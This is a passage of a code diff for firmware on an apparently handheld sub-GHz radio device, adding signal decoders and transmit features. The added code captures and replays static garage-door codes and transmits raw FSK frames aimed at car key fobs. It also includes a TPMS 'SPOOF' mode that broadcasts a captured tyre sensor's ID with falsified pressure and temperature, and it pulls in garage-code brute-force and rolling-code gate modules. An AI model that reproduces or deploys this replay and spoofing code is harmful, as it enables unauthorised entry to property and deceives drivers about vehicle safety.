-                else sp.printf("%.0fm  %s  %.0f", dist, totem_dir_str(bearing), bearing);
+                if (dist >= 1000) sp.printf("%.1fkm %s %.0f", dist / 1000.0f, totem_dir_str(bearing), bearing);
+                else sp.printf("%.0fm %s %.0f", dist, totem_dir_str(bearing), bearing);
             }
-
-            // Heading source indicator
+            y += 10;
             sp.setTextColor(TFT_DARKGREEN);
-            sp.setCursor(2, 108);
-            if (imu_available && imu_calibrated) sp.printf("IMU:%.0f", devHeading);
-            else if (hasHeading) sp.printf("GPS:%.0f", devHeading);
-            else if (imu_available) sp.print("IMU: press N=calib");
-            else sp.print("No IMU - move for GPS hdg");
+            sp.setCursor(2, y);
+            if (headSrc == 1) sp.printf("GPS %.0f", devHeading);
+            else if (headSrc == 2) sp.printf("IMU %.0f", devHeading);
+            else { sp.setTextColor(TFT_YELLOW); sp.print("No heading: point top North"); }
 
             sp.fillRect(0, H - 14, W, 14, 0x0841);
             sp.setTextColor(0x5AEB); sp.setCursor(2, H - 11);
@@ -40868,6 +42953,7 @@ void totemCompassMenu() {
     } // outer loop (mode selection)
 
 totem_cleanup:
+    totem_lora_stop();
     if (sprite) { sprite->deleteSprite(); delete sprite; sprite = nullptr; }
     totem_save_bonds();
     totem_running = false;
@@ -41230,6 +43316,12 @@ struct SubGhzDecoded {
     int te;
     bool valid;
     bool is_rolling;
+    uint64_t data_2;   // bits hauts (ex. HITAG2 Renault V1 : 24 bits de key_2).
+                       // DOIT rester en fin de struct : les decodeurs initialisent
+                       // out positionnellement en 9 champs (sans data_2) -> le mettre
+                       // ici garde bit_count/serial/... alignes (sinon cle=0 affichee).
+    uint32_t cap_freq_hz;  // freq + modulation de CAPTURE (renseignes a la volee lors du
+    uint8_t  cap_preset;   // push historique) -> le renvoi remet la radio sur la bonne RF.
 };
 
 #define DURATION_DIFF(a, b) abs((int32_t)(a) - (int32_t)(b))
@@ -41728,12 +43820,51 @@ void cc_extract_fields(SubGhzDecoded& d) {
     }
 }
 
+// ── Garage 433 (code STATIQUE 37 bits, PWM gap-first, Te=317us) ──
+// Reverse depuis Garage_capu_raw.sub (Flipper). START = 1 pulse haut 1.Te (ignore),
+// puis 37 bits ; chaque bit = gap PUIS pulse (3.Te total) :
+//   bit0 = gap 2.Te + pulse 1.Te ("001") ; bit1 = gap 1.Te + pulse 2.Te ("011").
+// Classification par largeur du PULSE (court=0, long=1). Emission sur gap de trame.
+struct GarageState { uint8_t synced; uint64_t data; uint8_t bits; bool skip_start; };
+static GarageState g_garage37 = {0, 0, 0, false};
+bool cc_feed_garage37(bool level, int32_t dur, SubGhzDecoded& out) {
+    const int Te = 317, TOL1 = 110, TOL2 = 150;
+    if (!level) {
+        if (dur > 5000) {                       // gap inter-trame = frontiere de trame
+            bool ok = (g_garage37.synced && g_garage37.bits == 37);
+            uint64_t code = g_garage37.data;
+            g_garage37.synced = 1; g_garage37.skip_start = true;
+            g_garage37.data = 0; g_garage37.bits = 0;
+            if (ok) {
+                out.protocol = "Garage37"; out.data = code; out.bit_count = 37;
+                out.is_rolling = false; out.te = Te; out.valid = true;
+                return true;
+            }
+            return false;
+        }
+        if (dur > 950) { g_garage37.synced = 0; g_garage37.bits = 0; g_garage37.data = 0; }  // gap anormal
+        return false;                           // petit gap intra-bit : ignore
+    }
+    if (!g_garage37.synced) return false;                       // pas encore de gap de trame vu
+    if (g_garage37.skip_start) { g_garage37.skip_start = false; return false; }  // pulse de START
+    int b;
+    if (DURATION_DIFF(dur, Te) < TOL1)          b = 0;          // pulse court -> 0
+    else if (DURATION_DIFF(dur, 2 * Te) < TOL2) b = 1;          // pulse long  -> 1
+    else { g_garage37.synced = 0; g_garage37.bits = 0; g_garage37.data = 0; return false; }
+    g_garage37.data = (g_garage37.data << 1) | (uint64_t)b;
+    g_garage37.bits++;
+    if (g_garage37.bits > 37) { g_garage37.synced = 0; g_garage37.bits = 0; g_garage37.data = 0; }
+    return false;
+}
+
 bool cc_decoders_feed(bool level, int32_t dur, SubGhzDecoded& out) {
     // Order matters! Most-specific first to avoid false positives.
     // 1. Holtek HT12X (12-bit 320/640us) MUST precede CAME (same timing, shorter preamble)
     if (cc_feed_holtek_ht12x(level, dur, out)) return true;
     // 2. KeeLoq (unique preamble pattern)
     if (cc_feed_keeloq(level, dur, out)) return true;
+    // 2b. Garage 37-bit static (specific : 37 bits gap-first PWM Te=317) — avant les tables
+    if (cc_feed_garage37(level, dur, out)) return true;
     // 3. Table-driven (Holtek 40-bit, Princeton, CAME, Nice FLO, Ansonic, etc.)
     for (int i = 0; i < (int)CC_NUM_TABLE_PROTOS; i++) {
         const SubGhzProto& p = cc_proto_table[i];
@@ -41783,6 +43914,12 @@ int32_t* cc_load_sub_malloc(const char* path, uint32_t* freq_hz, int* out_count)
         }
     }
     if (total == 0) { f.close(); *out_count = 0; return nullptr; }
+    // Cap adaptatif : les RAW streaming (Read RAW) peuvent avoir des dizaines de
+    // milliers de pulses -> malloc echouerait (heap). On limite a la moitie du plus
+    // gros bloc libre ; les tres gros RAW sont tronques (replay des 1eres trames).
+    int maxpulses = (int)(heap_caps_get_largest_free_block(MALLOC_CAP_8BIT) / (sizeof(int32_t) * 2));
+    if (maxpulses < 64) maxpulses = 64;
+    if (total > maxpulses) { Serial.printf("[LOAD] tronque %d->%d pulses (heap)\n", total, maxpulses); total = maxpulses; }
     // Allocate
     int32_t* buf = (int32_t*)malloc(total * sizeof(int32_t));
     if (!buf) { f.close(); *out_count = 0; return nullptr; }
@@ -41925,7 +44062,7 @@ bool cc_send_raw(int32_t* pulses, int count, int repeat) {
     delay(1);
 
     uint8_t marc = cc_read_status(CC_MARCSTATE) & 0x1F;
-    if (repeat < 10) repeat = 10;
+    if (repeat < 1) repeat = 1;
     Serial.printf("[TX] %d pulses x%d, MARC=0x%02X\n", count, repeat, marc);
 
     // TX via absolute-time GPIO — direct register writes, <1µs jitter
@@ -41956,10 +44093,76 @@ bool cc_send_raw(int32_t* pulses, int count, int repeat) {
     return true;
 }
 
+// ── Send raw 2-FSK via async serial (pour clés voiture FM : Kia/Ford/Honda) ──
+// Même timing GPIO que l'OOK, mais GDO0 HIGH = +déviation / LOW = -déviation.
+bool cc_send_raw_fsk(int32_t* pulses, int count, int repeat, uint8_t deviatn) {
+    if (count == 0) return false;
+    cc_strobe(CC_SIDLE); delay(1);
+    cc_write_reg(CC_IOCFG0, 0x0D);    // async serial data I/O
+    cc_write_reg(CC_PKTCTRL0, 0x32);  // async serial mode, infinite packet
+    cc_write_reg(CC_MDMCFG2, 0x00);   // 2-FSK, pas de sync, pas de manchester
+    cc_write_reg(CC_DEVIATN, deviatn);// déviation FSK (def ~0x47 ≈ 47kHz)
+    cc_write_reg(CC_FREND0, 0x10);    // PA index 0 (puissance constante en FSK)
+    cc_write_reg(CC_MDMCFG4, 0x67);
+    cc_write_reg(CC_MDMCFG3, 0x32);
+    uint8_t pa_fsk[8] = {0xC0, 0xC0, 0, 0, 0, 0, 0, 0};
+    cc_write_burst(CC_PA_TABLE, pa_fsk, 8);
+    cc_set_rf_switch(cc_freq_mhz);
+
+    pinMode(CC_GDO0, OUTPUT);
+    digitalWrite(CC_GDO0, LOW);
+    cc_strobe(CC_SFTX);
+    cc_strobe(0x33);  // SCAL
+    delay(2);
+    cc_strobe(CC_STX);
+    delay(1);
+    if (repeat < 1) repeat = 1;
+    Serial.printf("[TX-FSK] %d pulses x%d dev=0x%02X\n", count, repeat, deviatn);
+
+    uint32_t gdo0_mask = (1ULL << CC_GDO0);
+    GPIO.out_w1tc = gdo0_mask;
+    delayMicroseconds(2000);
+    for (int r = 0; r < repeat; r++) {
+        uint32_t t = (uint32_t)esp_timer_get_time();
+        for (int i = 0; i < count; i++) {
+            int32_t dur = abs(pulses[i]);
+            if (dur < 10) dur = 10;
+            if (dur > 200000) dur = 200000;
+            if (pulses[i] > 0) GPIO.out_w1ts = gdo0_mask;
+            else               GPIO.out_w1tc = gdo0_mask;
+            t += (uint32_t)dur;
+            while ((uint32_t)esp_timer_get_time() < t) ;
+        }
+    }
+    GPIO.out_w1tc = gdo0_mask;
+    delayMicroseconds(500);
+    cc_strobe(CC_SIDLE);
+    pinMode(CC_GDO0, INPUT);
+    cc_apply_preset(cc_preset_idx);
+    cc_set_frequency(cc_freq_mhz);
+    Serial.println("[TX-FSK] done");
+    return true;
+}
+
 // ── Signal encoder (reconstruct pulses from decoded data for replay) ──
 
 int cc_encode_signal(const SubGhzDecoded& sig, int32_t* pulses, int max_pulses) {
     if (sig.is_rolling || sig.te <= 0) return 0;
+    // Garage 433 (code STATIQUE 37 bits) — pas dans cc_proto_table, encode dedie.
+    // Frame = [START +1.Te] puis par bit gap-first : bit0 = [-2.Te,+1.Te], bit1 = [-1.Te,+2.Te].
+    // Gap inter-trame [-33800] en fin pour que les repeats (cc_send_raw) respectent le timing.
+    if (strcmp(sig.protocol, "Garage37") == 0) {
+        int Te = sig.te > 0 ? sig.te : 317;
+        int pos = 0;
+        pulses[pos++] = Te;                                  // pulse de START (1.Te haut)
+        for (int i = sig.bit_count - 1; i >= 0 && pos < max_pulses - 3; i--) {
+            bool bit = (sig.data >> i) & 1;
+            if (bit) { pulses[pos++] = -Te;     pulses[pos++] = 2 * Te; }  // gap court + pulse long
+            else     { pulses[pos++] = -2 * Te; pulses[pos++] = Te;     }  // gap long  + pulse court
+        }
+        if (pos < max_pulses) pulses[pos++] = -33800;        // gap inter-trame
+        return pos;
+    }
     const SubGhzProto* cfg = nullptr;
     for (int i = 0; i < (int)CC_NUM_TABLE_PROTOS; i++) {
         if (strcmp(cc_proto_table[i].name, sig.protocol) == 0) { cfg = &cc_proto_table[i]; break; }
@@ -42396,6 +44599,394 @@ void cc_waterfall(LovyanGFX& sp, bool use_sprite, M5Canvas* sprite) {
 
 // ── Sub-GHz Menu (Flipper-style UI with sprite rendering) ──
 
+// ── TPMS scanner (OOK/ASK) ── decodeur Schrader GG4, porte de l'app Flipper
+// wosk/flipperzero-tpms + rtl_433 schraeder.c. Modulation ASK (preset AM650),
+// Manchester II ~4.16 kbps (te 120/240 us), preambule 480us + 3 bits 0, 64 bits,
+// CRC8 poly 0x07. Couvre KIA/Mercedes/etc. (Schrader 3013/3015 MRX-GG4).
+// 433.92 MHz (EU) / 315 MHz (US) togglable. Ecoute seule.
+
+// Manchester state machine (porte de Flipper lib/toolbox/manchester_decoder.c)
+enum { MEV_ShortLow = 0, MEV_ShortHigh = 2, MEV_LongLow = 4, MEV_LongHigh = 6, MEV_Reset = 8 };
+enum { MST_Start1 = 0, MST_Mid1 = 1, MST_Mid0 = 2, MST_Start0 = 3 };
+static const uint8_t tpms_man_trans[] = { 0b00000001, 0b10010001, 0b10011011, 0b11111011 };
+bool tpms_man_advance(uint8_t st, uint8_t ev, uint8_t* nst, bool* data) {
+    bool res = false; uint8_t ns;
+    if (ev == MEV_Reset) ns = MST_Mid1;
+    else {
+        ns = (tpms_man_trans[st] >> ev) & 0x3;
+        if (ns == st) ns = MST_Mid1;
+        else if (ns == MST_Mid0) { if (data) *data = false; res = true; }
+        else if (ns == MST_Mid1) { if (data) *data = true;  res = true; }
+    }
+    *nst = ns; return res;
+}
+uint8_t tpms_crc8(const uint8_t* d, int n, uint8_t poly, uint8_t init) {
+    uint8_t c = init;
+    for (int i = 0; i < n; i++) { c ^= d[i]; for (int b = 0; b < 8; b++) c = (c & 0x80) ? (c << 1) ^ poly : (c << 1); }
+    return c;
+}
+
+// ── Portage des décodeurs ProtoPirate (GPLv3) — voir protopirate_port.h ──
+// Inclus ici : SubGhzDecoded / DURATION_DIFF / tpms_man_advance / tpms_crc8
+// et MST_*/MEV_* sont déjà définis au-dessus.
+#include "src/protopirate_port.h"
+// Décodeurs TPMS multi-marques (Schrader/Ford/Renault/Citroën/Toyota), portés
+// du PR Bruce #2675. Ajoute le RX FSK — indispensable, la plupart des TPMS
+// (dont Renault/Citroën) sont en 2-FSK, pas en OOK.
+#include "src/tpms_multi.h"
+// Décodeurs portails/volets rolling-code (Somfy/Nice/SecPlus/Hörmann/Marantec/
+// Dooya/CAME), portés du PR Bruce #2675 (AGPL-3.0).
+#include "src/rf_gate.h"
+#include "src/garage_brute.h"   // OpenSesame De Bruijn + DIP brute (codes fixes garages)
+
+#define TPMS_TE_SHORT 120
+#define TPMS_TE_LONG  240
+#define TPMS_TE_DELTA 55
+#define TPMS_BITS     64
+#define TPMS_DDIFF(a,b) ((uint32_t)((a) > (b) ? (a) - (b) : (b) - (a)))
+
+// TpmsSensor / TPMS_MAX / tpms_store sont définis dans tpms_multi.h (inclus ci-dessus).
+#define TPMS_RSSI() ((int)((int8_t)cc_read_status(CC_RSSI) / 2 - 74))
+
+void cc_tpms_scan(LovyanGFX& sp, bool use_sprite, M5Canvas* sprite) {
+    const int W = 240, H = 135;
+    const float FREQS[] = { 433.92f, 315.0f };
+    int fidx = 0;
+    // Presets : FM476 (2FSKDev47.6k) d'abord car la PLUPART des TPMS emettent en FSK
+    // LARGE (~+-40-50kHz) -> FM238 (dev 2.38k) est trop etroit et ne demodule pas ces
+    // capteurs (cause probable du "zero reception"). FM238 = capteurs FSK etroits.
+    // AM650 = Schrader OOK. TAB cycle les 3.
+    const int   PRESETS[] = { 3, 2, 0 };
+    const char* PNAMES[]  = { "FM476", "FM238", "AM650" };
+    const int   NPRESETS  = 3;
+    int pidx = 0;
+
+    cc_apply_preset(PRESETS[pidx]);
+    cc_set_frequency(FREQS[fidx]);
+    cc_set_raw_rx();
+    cc_isr_start();
+
+    static TpmsSensor sens[TPMS_MAX]; int sens_cnt = 0;
+
+    std::vector<int> durbuf; durbuf.reserve(4096);
+    unsigned long tpms_edges = 0;       // total edges recus (indicateur activite RX)
+    unsigned long last_edge_ms = millis();
+    uint32_t lastDraw = 0;
+    int sel = 0, top = 0;               // curseur liste + scroll
+    enterDebounce();
+
+    // draine l'ISR + décode -> range dans sens[] (partagé liste & détail)
+    auto pump = [&]() {
+        bool level; int32_t dur;
+        int guard = 0;
+        while (cc_isr_read(&level, &dur)) {
+            tpms_edges++;
+            if (dur > 20 && dur < 20000) durbuf.push_back(level ? dur : -dur);
+            last_edge_ms = millis();
+            if (durbuf.size() >= 4000) {
+                TpmsCode c; if (tpms_multi_decode(durbuf, c)) tpms_store(sens, sens_cnt, c, TPMS_RSSI(), millis(), FREQS[fidx]);
+                durbuf.clear();
+            }
+            // Sous flot de bruit (FM476 = deviation large), les edges arrivent en
+            // continu : ne pas draîner sans fin, sinon la boucle principale (keys +
+            // delay->watchdog feed) est affamée -> Task/Int WDT -> reset. On rend la
+            // main apres un quota, on reviendra draîner au prochain pump().
+            if (++guard >= 4000) break;
+        }
+        if (durbuf.size() >= 40 && (millis() - last_edge_ms) > 25) {
+            TpmsCode c; if (tpms_multi_decode(durbuf, c)) tpms_store(sens, sens_cnt, c, TPMS_RSSI(), millis(), FREQS[fidx]);
+            durbuf.clear();
+        }
+    };
+
+    while (true) {
+        M5.update(); cardUpdate();
+        pump();
+        esp_task_wdt_reset();   // scan continu + decode : nourrit le WDT quoi qu'il arrive
+        if (kp(KEY_BACKSPACE)) { keyRelease(); break; }
+        if (kp('f') || kp('F')) {
+            keyRelease(); cc_isr_stop();
+            fidx = (fidx + 1) % 2; cc_set_frequency(FREQS[fidx]);
+            cc_set_raw_rx(); cc_isr_start(); durbuf.clear(); lastDraw = 0;
+        }
+        if (kp(KEY_TAB)) {                          // cycle FM476 -> FM238 -> AM650
+            keyRelease(); cc_isr_stop();
+            pidx = (pidx + 1) % NPRESETS; cc_apply_preset(PRESETS[pidx]);
+            cc_set_raw_rx(); cc_isr_start(); durbuf.clear(); lastDraw = 0;
+        }
+        if (kp(';')) { keyRelease(); if (sel > 0) sel--; lastDraw = 0; delay(90); }
+        if (kp('.')) { keyRelease(); if (sel < sens_cnt - 1) sel++; lastDraw = 0; delay(90); }
+
+        // ── ENTER : page détail (scrollable, continue à se mettre à jour) ──
+        if (kp(KEY_ENTER) && sens_cnt > 0) {
+            keyRelease();
+            int dscroll = 0; uint32_t dDraw = 0; enterDebounce();
+            while (true) {
+                M5.update(); cardUpdate();
+                pump();                              // le détail reste live
+                esp_task_wdt_reset();
+                if (kp(KEY_BACKSPACE)) { keyRelease(); break; }
+                if (kp(';')) { keyRelease(); if (dscroll > 0) dscroll--; dDraw = 0; delay(90); }
+                if (kp('.')) { keyRelease(); dscroll++; dDraw = 0; delay(90); }
+                if (kp(',')) { keyRelease(); if (sel > 0) { sel--; dscroll = 0; } dDraw = 0; delay(90); }
+                if (kp('/')) { keyRelease(); if (sel < sens_cnt - 1) { sel++; dscroll = 0; } dDraw = 0; delay(90); }
+                // ── E : SPOOF (ré-émettre avec pression/temp modifiées) ──
+                if (kp('e') || kp('E')) {
+                    keyRelease();
+                    TpmsSensor& s0 = sens[sel];
+                    float ekpa = s0.kpa; int etemp = s0.temp; int erep = 3; int efield = 0;
+                    bool fskP = (s0.preset && strncmp(s0.preset, "2FSK", 4) == 0);
+                    uint32_t eDraw = 0; const char* est = "";
+                    enterDebounce();
+                    while (true) {
+                        M5.update(); cardUpdate();
+                        if (kp(KEY_BACKSPACE)) { keyRelease(); break; }
+                        if (kp(';')) { keyRelease(); efield = (efield + 2) % 3; eDraw = 0; delay(110); }
+                        if (kp('.')) { keyRelease(); efield = (efield + 1) % 3; eDraw = 0; delay(110); }
+                        if (kp(',')) { keyRelease(); if (efield == 0) ekpa -= 5; else if (efield == 1) etemp -= 1; else erep = max(1, erep - 1); est = ""; eDraw = 0; delay(80); }
+                        if (kp('/')) { keyRelease(); if (efield == 0) ekpa += 5; else if (efield == 1) etemp += 1; else erep = min(20, erep + 1); est = ""; eDraw = 0; delay(80); }
+                        if (kp(KEY_ENTER)) {
+                            keyRelease();
+                            bool fsk = false;
+                            int nn = tpms_spoof_encode(s0, ekpa, etemp, cc_raw_pulses, CC_MAX_PULSES, &fsk);
+                            if (nn <= 0) est = "encoder N/A (Toyota)";
+                            else {
+                                cc_isr_stop();
+                                cc_set_frequency(s0.freq);
+                                cc_apply_preset(fsk ? 2 : 0);
+                                if (fsk) cc_send_raw_fsk(cc_raw_pulses, nn, erep, 0x47);
+                                else     cc_send_raw(cc_raw_pulses, nn, erep);
+                                cc_apply_preset(PRESETS[pidx]); cc_set_frequency(FREQS[fidx]);
+                                cc_set_raw_rx(); cc_isr_start();
+                                est = "SENT";
+                            }
+                            eDraw = 0;
+                        }
+                        if (millis() - eDraw < 200) { delay(3); continue; }
+                        eDraw = millis();
+                        sp.fillScreen(TFT_BLACK);
+                        sp.fillRect(0, 0, W, 16, 0x0841); sp.drawFastHLine(0, 16, W, 0xFC00);
+                        sp.setTextFont(1); sp.setTextSize(1.5); sp.setTextColor(0xFC00, 0x0841);
+                        sp.setCursor(4, 2); sp.printf("SPOOF %s %08lX", s0.proto ? s0.proto : "?", (unsigned long)s0.id);
+                        sp.setTextSize(1);
+                        sp.setTextColor(efield == 0 ? TFT_GREEN : TFT_WHITE, efield == 0 ? TFT_NAVY : TFT_BLACK);
+                        sp.setCursor(6, 28); sp.printf(" Pressure: %.0f kPa (%.2f bar) ", ekpa, ekpa / 100.0f);
+                        sp.setTextColor(efield == 1 ? TFT_GREEN : TFT_WHITE, efield == 1 ? TFT_NAVY : TFT_BLACK);
+                        sp.setCursor(6, 42); sp.printf(" Temp    : %d C ", etemp);
+                        sp.setTextColor(efield == 2 ? TFT_GREEN : TFT_WHITE, efield == 2 ? TFT_NAVY : TFT_BLACK);
+                        sp.setCursor(6, 56); sp.printf(" Repeat  : %d ", erep);
+                        sp.setTextColor(0x5AEB, TFT_BLACK); sp.setCursor(6, 74);
+                        sp.printf("Band %.2f MHz  %s", s0.freq, fskP ? "FSK" : "OOK");
+                        if (est[0]) { sp.setTextColor(TFT_CYAN, TFT_BLACK); sp.setCursor(6, 90); sp.print(est); }
+                        sp.fillRect(0, H - 14, W, 14, 0x0841); sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(2, H - 12);
+                        sp.print(";. field  ,/ value  ENT=TX  BACK");
+                        if (use_sprite) sprite->pushSprite(0, 0);
+                        delay(3);
+                    }
+                    dDraw = 0; enterDebounce();
+                }
+                if (millis() - dDraw < 250) { delay(2); continue; }
+                dDraw = millis();
+                TpmsSensor& s = sens[sel];
+                char L[16][40]; int n = 0;
+                snprintf(L[n++], 40, "Proto : %s", s.proto ? s.proto : "?");
+                snprintf(L[n++], 40, "Serial: 0x%08lX", (unsigned long)s.id);
+                snprintf(L[n++], 40, "Press : %.2f bar", s.bar);
+                snprintf(L[n++], 40, "        %.1f PSI / %.0f kPa", s.bar * 14.5038f, s.kpa);
+                snprintf(L[n++], 40, "Temp  : %d C", s.temp);
+                snprintf(L[n++], 40, "Btn/Fl: 0x%02X    Cnt: 0x%04X", s.btn, s.cnt);
+                if (s.fix) snprintf(L[n++], 40, "Batt  : 0x%02X", (unsigned)s.fix);
+                snprintf(L[n++], 40, "Bits  : %d    TE: %d us", s.Bit, s.te);
+                snprintf(L[n++], 40, "Band  : %.2f MHz", s.freq);
+                snprintf(L[n++], 40, "Preset: %s", s.preset ? s.preset : "?");
+                snprintf(L[n++], 40, "RSSI  : %d dBm", s.rssi);
+                snprintf(L[n++], 40, "Hits  : %lu", (unsigned long)s.hits);
+                snprintf(L[n++], 40, "Age   : %lus  (first %lus)",
+                         (unsigned long)((millis() - s.last) / 1000), (unsigned long)((millis() - s.first) / 1000));
+                int maxvis = (H - 16 - 14) / 12;
+                if (dscroll > n - maxvis) dscroll = (n > maxvis) ? n - maxvis : 0;
+                if (dscroll < 0) dscroll = 0;
+                sp.fillScreen(TFT_BLACK);
+                sp.fillRect(0, 0, W, 16, 0x0841); sp.drawFastHLine(0, 16, W, 0xFC00);
+                sp.setTextFont(1); sp.setTextSize(1.5); sp.setTextColor(0xFC00, 0x0841);
+                sp.setCursor(4, 2); sp.printf("TPMS #%d/%d  %s", sel + 1, sens_cnt, s.proto ? s.proto : "?");
+                sp.setTextSize(1);
+                int y = 20;
+                for (int i = dscroll; i < n && y < H - 14; i++) { sp.setTextColor(TFT_GREEN, TFT_BLACK); sp.setCursor(4, y); sp.print(L[i]); y += 12; }
+                sp.fillRect(0, H - 14, W, 14, 0x0841); sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(2, H - 12);
+                sp.print(";.scroll ,/sens E=spoof BACK");
+                if (use_sprite) sprite->pushSprite(0, 0);
+                delay(2);
+            }
+            lastDraw = 0; enterDebounce();
+        }
+
+        if (millis() - lastDraw > 300) {
+            lastDraw = millis();
+            const int listVis = (H - 16 - 14) / 12;   // ~8 lignes
+            if (sel < 0) sel = 0; if (sel > sens_cnt - 1) sel = sens_cnt - 1; if (sel < 0) sel = 0;
+            if (sel < top) top = sel;
+            if (sel >= top + listVis) top = sel - listVis + 1;
+            if (sens_cnt == 0) top = 0;
+            sp.fillScreen(TFT_BLACK);
+            sp.fillRect(0, 0, W, 16, 0x0841);
+            sp.drawFastHLine(0, 16, W, 0xFC00);
+            sp.setTextFont(1); sp.setTextSize(1.5); sp.setTextColor(0xFC00, 0x0841);
+            sp.setCursor(4, 4); sp.printf("TPMS %s %.2f", PNAMES[pidx], FREQS[fidx]);
+            // activite compacte a droite (taille 1, bornee) -> ne deborde jamais l'entete
+            sp.setTextSize(1); sp.setTextColor(0xFC00, 0x0841);
+            char eb[12];
+            if (tpms_edges < 10000UL)        snprintf(eb, sizeof eb, "%lu", tpms_edges);
+            else if (tpms_edges < 10000000UL) snprintf(eb, sizeof eb, "%luk", tpms_edges / 1000UL);
+            else                              snprintf(eb, sizeof eb, "%luM", tpms_edges / 1000000UL);
+            sp.setCursor(W - 78, 1); sp.printf("#%d e%s", sens_cnt, eb);
+            sp.setCursor(W - 78, 9); sp.printf("%d dBm", (int)TPMS_RSSI());
+            int y = 20;
+            for (int i = top; i < sens_cnt && y < H - 14; i++) {
+                TpmsSensor& s = sens[i];
+                if (i == sel) { sp.fillRect(0, y - 1, W, 11, TFT_NAVY); sp.setTextColor(TFT_GREEN, TFT_NAVY); }
+                else sp.setTextColor(TFT_GREEN, TFT_BLACK);
+                sp.setCursor(2, y);
+                sp.printf("%-7s %08lX %.2fb %dC %ddBm", s.proto ? s.proto : "?",
+                          (unsigned long)s.id, s.bar, s.temp, s.rssi);
+                y += 12;
+            }
+            if (sens_cnt == 0) {
+                sp.setTextColor(TFT_YELLOW); sp.setCursor(6, 52);
+                sp.print("Listening... drive to wake sensors");
+                sp.setTextColor(0x5AEB); sp.setCursor(6, 66);
+                sp.print("TAB: FM476/FM238/AM650  F: freq");
+            }
+            sp.fillRect(0, H - 14, W, 14, 0x0841);
+            sp.setTextColor(0x5AEB, 0x0841); sp.setCursor(2, H - 12);
+            sp.print(";. sel ENT=detail F=frq TAB=AM/FM BACK");
+            if (use_sprite) sprite->pushSprite(0, 0);
+        }
+        delay(2);
+    }
+    cc_isr_stop();
+}
+
+// ══════════ Historique de captures + navigation liste/detail (facon Flipper) ══════════
+// Ajoute une capture a l'historique. Dedup : meme proto/data/bits/serial/cnt -> +1 hit
+// (les rolling codes changent de cnt a chaque appui -> nouvelles entrees ; les statiques
+//  repetes incrementent le compteur). Buffer sur heap (vector), borne a maxn.
+void cc_hist_push(std::vector<SubGhzDecoded>& h, std::vector<uint16_t>& n,
+                  const SubGhzDecoded& d, int maxn, int& sel, bool follow,
+                  uint32_t cap_freq, uint8_t cap_preset) {
+    SubGhzDecoded e = d;                    // memorise la RF de capture -> renvoi correct
+    e.cap_freq_hz = cap_freq; e.cap_preset = cap_preset;
+    for (size_t i = 0; i < h.size(); i++) {
+        if (h[i].protocol && e.protocol && strcmp(h[i].protocol, e.protocol) == 0 &&
+            h[i].data == e.data && h[i].bit_count == e.bit_count &&
+            h[i].serial == e.serial && h[i].cnt == e.cnt) {
+            if (n[i] < 65535) n[i]++;
+            h[i] = e;                       // rafraichit te/champs
+            if (follow) sel = (int)i;
+            return;
+        }
+    }
+    h.push_back(e); n.push_back(1);
+    if ((int)h.size() > maxn) { h.erase(h.begin()); n.erase(n.begin()); if (sel > 0) sel--; }
+    if (follow) sel = (int)h.size() - 1;    // suit la plus recente
+}
+
+// Log durable d'une capture sur SD (stockage principal ; le ring RAM reste petit/borne).
+void cc_hist_log_sd(const SubGhzDecoded& e, uint32_t freq_hz) {
+    SD.mkdir("/evil/subghz");
+    File f = SD.open("/evil/subghz/captures.csv", FILE_APPEND);
+    if (!f) return;
+    if (f.size() == 0) f.println("proto,key,bits,serial,btn,cnt,te,rolling,freq_hz,ms");
+    uint64_t mask = e.data & ((e.bit_count < 64) ? ((1ULL << e.bit_count) - 1) : 0xFFFFFFFFFFFFFFFFULL);
+    f.printf("%s,%llX,%d,%X,%X,%u,%d,%d,%lu,%lu\n",
+             e.protocol ? e.protocol : "?", (unsigned long long)mask, e.bit_count,
+             (unsigned)e.serial, (unsigned)e.btn, (unsigned)e.cnt, e.te,
+             e.is_rolling ? 1 : 0, (unsigned long)freq_hz, (unsigned long)millis());
+    f.close();
+}
+
+// Emission d'une trame en CALANT la radio sur la freq + modulation de CAPTURE de
+// l'entree (sinon un vrai recepteur/ProtoPirate ne reconnait pas). Restaure ensuite
+// la RF courante. Retourne true si emis en 2-FSK. Presets : 0/1=OOK(AM), 2/3=2-FSK(FM).
+bool cc_tx_on_capture(int32_t* pulses, int n, const SubGhzDecoded& e,
+                      uint32_t cur_freq_hz, int cur_preset, bool enc_fsk, int repeats) {
+    if (e.cap_freq_hz) cc_set_frequency(e.cap_freq_hz / 1000000.0f);
+    cc_apply_preset(e.cap_preset);
+    bool fsk = enc_fsk || (e.cap_preset >= 2);      // FM238/FM476 = 2-FSK
+    if (fsk) cc_send_raw_fsk(pulses, n, repeats, 0x47);
+    else     cc_send_raw(pulses, n, repeats);
+    // restaure la RF courante (freq + preset de l'ecran)
+    cc_set_frequency(cur_freq_hz / 1000000.0f);
+    cc_apply_preset(cur_preset);
+    return fsk;
+}
+
+// Popup config RF (touche C) : Frequence + Modulation. ;/. = champ, ,// = -/+, BACK applique.
+// Retourne true si qqch a change (l'appelant re-init alors le RX).
+bool cc_config_popup(LovyanGFX& sp, bool use_sprite, M5Canvas* sprite,
+                     int W, int H, int& freq_idx, int& preset_idx) {
+    int field = 0; bool changed = false, redraw = true;
+    while (true) {
+        M5.update(); cardUpdate();
+        if (kp(KEY_BACKSPACE)) { keyRelease(); break; }
+        if (kp(';') || kp('.')) { keyRelease(); field ^= 1; redraw = true; delay(120); }
+        if (kp(',')) { keyRelease();
+            if (field == 0) freq_idx = max(freq_idx - 1, 0);
+            else            preset_idx = (preset_idx + 3) % 4;
+            changed = true; redraw = true; delay(120); }
+        if (kp('/')) { keyRelease();
+            if (field == 0) freq_idx = min(freq_idx + 1, 17);
+            else            preset_idx = (preset_idx + 1) % 4;
+            changed = true; redraw = true; delay(120); }
+        if (!redraw) { delay(10); continue; }
+        redraw = false;
+        sp.fillScreen(TFT_BLACK);
+        sp.fillRect(0, 0, W, 14, 0x0841); sp.drawFastHLine(0, 14, W, 0xFC00);
+        sp.setTextColor(0xFC00, 0x0841); sp.setCursor(2, 3); sp.print("Config RF");
+        float mhz = cc_frequencies[freq_idx] / 1000.0f;
+        sp.setTextColor(field == 0 ? TFT_GREEN : TFT_WHITE, field == 0 ? TFT_NAVY : TFT_BLACK);
+        sp.setCursor(10, 38); sp.printf(" Freq : %.3f MHz ", mhz);
+        sp.setTextColor(field == 1 ? TFT_GREEN : TFT_WHITE, field == 1 ? TFT_NAVY : TFT_BLACK);
+        sp.setCursor(10, 60); sp.printf(" Mod  : %s ", cc_presets[preset_idx].name);
+        sp.setTextColor(0x5AEB, TFT_BLACK);
